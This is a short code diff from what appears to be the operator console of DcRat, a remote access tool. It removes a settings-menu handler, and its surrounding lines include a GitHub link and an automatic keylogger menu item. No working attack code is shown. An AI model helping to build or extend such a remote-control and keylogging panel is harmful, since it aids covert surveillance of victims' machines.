@@ -1788,14 +1788,6 @@ namespace Server
             Process.Start("https://github.com/qwqdanchun/DcRat");
         }
 
-        private void SettingToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            using (FormSetting formSetting = new FormSetting())
-            {
-                formSetting.ShowDialog();
-            }
-        }
-
         private void autoKeyloggerToolStripMenuItem_Click(object sender, EventArgs e)
         {
             try
